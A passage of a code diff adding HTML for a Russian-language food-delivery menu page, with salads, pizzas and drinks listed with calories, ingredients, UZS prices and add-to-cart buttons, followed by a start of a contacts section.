+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Салаты и закуски -->
+                <br>
+                <div class="t-section__container t-container">
+                    <div class="t-col t-col_12">
+                        <div class="t-section__topwrapper t-align_center">
+                            <div class="t-section__title t-title t-title_xs"
+                                field="btitle">
+                                <font color="#0000CD">Салаты и закуски</font>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="t-container t599__withfeatured">
+                    <!-- 1 салат -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Салат
+                                "Оливье"</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">300 г 264
+                                ккал<br></div>
+                            <img src="/views/food/333593257_m650_4c4c5581ea286b673a1b73b07c06323b17ddad819ed6.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                29202<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Набор на мясной салат
+                                        (оливье)(картофель оварной, морковь
+                                        отварная), майонез провансаль,
+                                        колбаса докторская по-коломенски, огурцы
+                                        маринованные, яйцо столовое
+                                        отборное мытое, горошек зеленый с/м,
+                                        огурцы свежие, лук жаренный сухой
+                                        (ук жареный сухой (репчатый. 264
+                                        ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Салат Оливье=29202" target="_blank"
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 2 салат -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Салат
+                                цезарь с куриным филе</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">110 г
+                                340 ккал<br></div>
+                            <img src="/views/food/326079350_m650_ff84b9da11c8dc9fd9f4e781ae9179f593dafda4ce40.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                16933<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: салат, заправка, сухари из
+                                        пшеничного хлеба со вкусом и ароматом
+                                        паприки; салат: салат айсберг,
+                                        салат романо, филе куриное маринованное
+                                        (для салата цезарь)(филе
+                                        куриное, кефир, соус соевый (соевые
+                                        бобы, мука пшеничная, консервант
+                                        е202), вода питьев. 340 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Салат цезарь с куриным филе=16933"
+                                target="" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 3 салат -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title3" style="height: 59px;">Студень из
+                                говядины</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle3" style="height: 22px;">440 г 81
+                                ккал<br></div>
+                            <img src="/views/food/339824024_m650_325379f31e30612beb6227306e37404c1abaa393927d.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price3" style="height: 52px;">UZS
+                                53740<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr3" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Студень из говядины (ланспиг
+                                        (бульон (морковь, лук, специи (соль,
+                                        перец ч/м, перец д/г, лавровый
+                                        лист), желатин), бульонка (вода,
+                                        говядина, морковь, лук, специи (соль,
+                                        перец ч/м, перец д/г, лавровый лист)),
+                                        говядина, куриное филе, чеснок
+                                        свежий), хрен стол. 81 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Студень из говядины=53740" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+                <!-- 2 часть -->
+                <div class="t-container t599__withfeatured">
+                    <!-- 4 салат -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Селедочка с
+                                луком</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">85 г 180
+                                ккал<br></div>
+                            <img src="/views/food/332223704_m650_595c779a6bc7525276094efc243c2cd19b7e9b00af10.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                10139<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: сельдь филе в масле, лук
+                                        репчатый очищенный, масло подсолнечное,
+                                        укроп.). 180 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Селедочка с луком=10139"
+                                target="_blank" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 5 салат -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Винегрет
+                            </div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">100 г
+                                130 ккал<br></div>
+                            <img src="/views/food/303022818_m650_f3b09416af5ec936955d2c402c9b9a9ee532cab03476.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                9734<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Свекла, картофель, морковь,
+                                        огурцы маринованные, зеленый горошек
+                                        консервированный натуральный, масло
+                                        подсолнечное нерафинированное, лук
+                                        зеленый, соль. Вес (нетто)/ объем:
+                                        0.12 Кг. 130 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Винегрет=9734" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+
+                </div>
+
+                <!-- Пицца  -->
+                <br>
+                <div class="t-section__container t-container">
+                    <div class="t-col t-col_12">
+                        <div class="t-section__topwrapper t-align_center">
+                            <div class="t-section__title t-title t-title_xs"
+                                field="btitle">
+                                <font color="#0000CD">Пицца</font>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="t-container t599__withfeatured">
+                    <!-- 1 Пицца -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Маргарита
+                            </div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">367 г 152
+                                ккал<br></div>
+                            <img src="/views/food/329632877_m650_90a1d29e858e80c85ae20ce273138d364a2ad53bf891.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                39545<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Моцарелла, томаты, орегано,
+                                        томатный соус, основа для пиццы (30 х20
+                                        см). На 100 г кбжу:160/7/4/23.
+                                        Употребить сразу после доставки. 152
+                                        ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Маргарита=39545" target="_blank"
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 2 Пицца -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Пепперони
+                            </div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">368 г
+                                179 ккал<br></div>
+                            <img src="/views/food/329632884_m650_e409085a8aa2acf8c440dd5f26c6b3f66b26859a6e73.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                39545<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Моцарелла, пепперони, томатный
+                                        соус, основа для пиццы (30 х20 см). На
+                                        100 г кбжу:185/8/7/22. Употребить
+                                        сразу после доставки. 179 ккал/100 г
+                                    </li>
+                                </ul>
+                            </div>
+                            <a href="#order:Пепперони=39545" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 3 Пицца -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title3" style="height: 59px;">Овощная
+                            </div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle3" style="height: 22px;">482 г
+                                154 ккал<br></div>
+                            <img src="/views/food/329632895_m650_344bea0f37195890551991ee6c5de87d36d1b7e4e2c0.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price3" style="height: 52px;">UZS
+                                39545<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr3" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Моцарелла, шампиньоны, маслины,
+                                        брокколи, томаты, чеснок, орегано, перец
+                                        болгарский зеленый, базилик,
+                                        масло оливковое, томатный соус, основа
+                                        для пиццы (30 х20 см). На 100 г
+                                        кбжу:154/7/5/20. Употребить сразу после
+                                        доставки. 154 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Овощная=39545" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+                <div class="t-container t599__withfeatured">
+                    <!-- 4 Пицца -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Ветчина и
+                                грибы</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">377 г 174
+                                ккал<br></div>
+                            <img src="/views/food/331027273_m650_6cd1c1f3401bdb4d4fa565c1b781fb5892e90002862a.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                39545<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Ветчина из свинины, моцарелла,
+                                        шампиньоны, чеснок свежий, масло
+                                        оливковое, сливочный соус, основа для
+                                        пиццы (30 х20 см). На 100 г
+                                        кбжу:174/8/6/21. Употребить сразу после
+                                        доставки. 174 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Ветчина и грибы=39545"
+                                target="_blank" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 5 Пицца -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Сырная
+                            </div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">335 г
+                                179 ккал<br></div>
+                            <img src="/views/food/329632896_m650_03ebaa28b00f9d7e275b6ddbf79ca52d66271ccc2c5d.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                39545<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Моцарелла, фета, орегано,
+                                        сливочный соус, основа для пиццы (30 х20
+                                        см). На 100 г кбжу:179/8/6/22.
+                                        Употребить сразу после доставки. 179
+                                        ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Сырная=39545" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 6 Пицца -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title3" style="height: 59px;">Грибная с
+                                трюфельным маслом</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle3" style="height: 22px;">416 г
+                                187 ккал<br></div>
+                            <img src="/views/food/329632886_m650_52c9be8e586673a18d39eff16e51c0a8fbba68c0216e.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price3" style="height: 52px;">UZS
+                                49684<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr3" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Моцарелла, шампиньоны, руккола,
+                                        томаты черри, чеснок, трюфельное масло,
+                                        масло оливковое и подсолнечное,
+                                        орегано, розмарин, сливочный соус,
+                                        основа для пиццы (30 х20 см). На 100
+                                        г кбжу:187/8/8/21. Употребить сразу
+                                        после доставки. 187 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Грибная с трюфельным маслом=49684"
+                                target="" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+
+
+                <!-- Напитки  -->
+                <br>
+                <div class="t-section__container t-container">
+                    <div class="t-col t-col_12">
+                        <div class="t-section__topwrapper t-align_center">
+                            <div class="t-section__title t-title t-title_xs"
+                                field="btitle">
+                                <font color="#0000CD">Напитки</font>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="t-container t599__withfeatured">
+                    <!-- 1 Напитки -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Морс ягодный
+                            </div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">55
+                                ккал<br></div>
+                            <img src="/views/food/313921925_m650_5a6993c3eb36922834800875d9808c6d5268e1615acf.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                22814<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: вода питьевая, сахар-песок,
+                                        клюква, смородина черная, смородина
+                                        красная, брусника, лимонная кислота,
+                                        консервант(е211).) Б0,1 ж0 у14 э55/230.
+                                        55 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Морс ягодный=22814" target="_blank"
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 2 Напитки -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Компот из
+                                сухофруктов 0,5</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">500 мл
+                                50 ккал<br></div>
+                            <img src="/views/food/335846671_m650_068b671ac5786234af17efb56f6ff5eab94e4f200fc2.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                12471<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Вода питьевая, смесь
+                                        сухофруктов (чернослив, изюм, курага),
+                                        сахар, регулятор кислотности -
+                                        лимонная кислота, бензоат натрия. 50
+                                        ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Компот из сухофруктов 0,5=12471"
+                                target="" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 3 Напитки -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title3" style="height: 59px;">Кока-кола
+                            </div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle3" style="height: 22px;">42
+                                ккал<br></div>
+                            <img src="/views/food/313921934_m650_85f228ac3a7aef2d88f8a02ad3cbf75485bed0b4db4b.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price3" style="height: 52px;">UZS
+                                11052<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr3" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: очищенная вода, сахар, сахарный
+                                        колер iv, регулятор кислотности
+                                        ортофосфорная кислота, натуральные
+                                        ароматизаторы, кофеин (менее 150 мг/л)).
+                                        42 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Кока-кола=11052" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+                <div class="t-container t599__withfeatured">
+                    <!-- 4 Напитки -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Кока-кола
+                                без сахара</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">40
+                                ккал<br></div>
+                            <img src="/views/food/313921935_m650_af677d40a00edbfb041538d67b9b218cdcf326e8b535.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                11052<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: очищенная вода, краситель
+                                        сахарный колер iv, регулятор кислотности
+                                        (ортофосфорная кислота, цитрат
+                                        натрия), подсластители (цикламат натрия,
+                                        ацесульфам калия, аспартам),
+                                        натуральные ароматизаторы, кофеим (менее
+                                        150 мг/л)). Продукт содержит
+                                        источник ф. 40 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Кока-кола без сахара=11052"
+                                target="_blank" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 5 Напитки -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Фанта
+                                апельсин</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">33
+                                ккал<br></div>
+                            <img src="/views/food/313921936_m650_d478309ae54338f7bf518b3144f2f23b436f92d4195b.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                11052<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: очищенная вода, сахар,
+                                        апельсиновый сок 3%, регуляторы
+                                        кислотности (лимонная кислота, яблочная
+                                        кислотаглюконат натрия), витамин с,
+                                        натуральные ароматизаторы,
+                                        подсластитель сахаринат натрия,
+                                        стабилизаторы (эфиры глицерина и
+                                        смоляных кислот, гуаровая. 33 ккал/100 г
+                                    </li>
+                                </ul>
+                            </div>
+                            <a href="#order:Фанта апельсин=11052" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 6 Напитки -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title3" style="height: 59px;">Спрайт
+                            </div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle3" style="height: 22px;">10
+                                ккал<br></div>
+                            <img src="/views/food/313921937_m650_59ed114b908287d639b8e5bd2968dbc78670de5c0c42.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price3" style="height: 52px;">UZS
+                                11052<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr3" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: очищенная вода, сахар,
+                                        регуляторы кислотности (лимонная
+                                        кислота, цитрат натрия), натуральные
+                                        ароматизаторы, подсластители (ацесульфам
+                                        калия, аспартам, неогеспиридин
+                                        дигидрохалкон)). Продукт содержит
+                                        источник фенилаланина. 10 ккал/100 г
+                                    </li>
+                                </ul>
+                            </div>
+                            <a href="#order:Спрайт=11052" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            </div>
+            <style type="text/css">
+                #rec80994492 .t599__featured .t599__content {
+                    box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.10) !important;
+                }
+            </style>
+            <script type="text/javascript">
+                $(document).ready(function () {
+                    setTimeout(function () {
+                        t599_init('80994492');
+                    }, 500);
+                    $(window).bind('resize', t_throttle(function () {
+                        t599_init('80994492')
+                    }, 250));
+                    $('.t599').bind('displayChanged', function () {
+                        t599_init('80994492');
+                    });
+                });
+                $(window).load(function () {
+                    t599_init('80994492');
+                });
+            </script>
+        </div>
+        <div id="rec79849679" class="r t-rec" style=" "
+            data-animationappear="off" data-record-type="826">
+            <div class="t826" data-galaxy-rec-ids="79851894"
+                data-element-spread="" data-element-color=""
+                data-element-opacity="0.70" style="display:table;width:100%;">
+                <div class="t826__animation">
+                    <div data-galaxy-id="79849679" class="t826__galaxy"
+                        style="background-image: -moz-linear-gradient(top, rgba(0,0,0,0.50), rgba(20,39,112,0.50));	background-image: -webkit-linear-gradient(top, rgba(0,0,0,0.90), rgba(20,39,112,0.80));	background-image: -o-linear-gradient(top, rgba(0,0,0,0.90), rgba(20,39,112,0.80));	background-image: -ms-linear-gradient(top, rgba(0,0,0,0.90), rgba(20,39,112,0.80));	background-image: linear-gradient(top, rgba(0,0,0,0.90), rgba(20,39,112,0.80));	filter: progid:DXImageTransform.Microsoft.gradient(startColorStr='#19000000', endColorstr='#33142770'); ">
+                        <div class="t826__galaxy-wrapper">
+                            <div class="t826__galaxy-far"></div>
+                            <div class="t826__galaxy-mid"></div>
+                            <div class="t826__galaxy-near"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <script type="text/javascript">
+                $(document).ready(function () {
+                    setTimeout(function () {
+                        t826_init('79849679');
+                    });
+                });
+            </script>
+        </div> 
+
+        <link href="/views/food/bootstrap.css" rel="stylesheet">
+        <script type="text/javascript" src="/views/food/bootstrap.js"></script>
+
+        <div id="rec80995416" class="r t-rec t-rec_pt_150 t-rec_pb_150"
+            style="padding-top:150px;padding-bottom:150px; "
+            data-animationappear="off" data-record-type="718">
+            <!-- t718 -->
+            <div class="t718">
+                <div class="t-section__container t-container">
+                    <div class="t-col t-col_12">
+                        <div class="t-section__topwrapper t-align_center">
+                            <div class="t-section__title t-title t-title_xs"
+                                field="btitle">Наши контакты</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="t-container">
+                    <div class="t-col t-col_5 t-prefix_1">
+                        <div class="t718__contentbox" style="height:;">
+                            <div class="t718__contentwrapper">
+                                <!--<div class="t718__contacts t-text t-descr_xxxl" style="" field="text">hot-bowl@mail.ru</div>-->
+                                <div class="t718__address t-text t-text_sm"
+                                    style="" field="text2">
+
+                                    <p> </p>
+                                    <li><i class="fa fa-phone"></i> <span> <b>По
+                                                поводу вопросов
+                                            </b></span>Онлайн чат. Ответим в
+                                        течении 5 минут<p></p>
+
+                                        <ul>
+                                            <!--<li> Адрес: г. Москва, ул. Дурова, 3/13 </li> 
+                              <li> Адрес: г. Санкт-Петербург ул. Ефимова, 3 </li>
+                              <li> Адрес: г. Пенза, ул. Тарханова, 10В </li> 
+                              <li> Адрес: г. Омск, ул. 70 лет Октября, 25 </li>
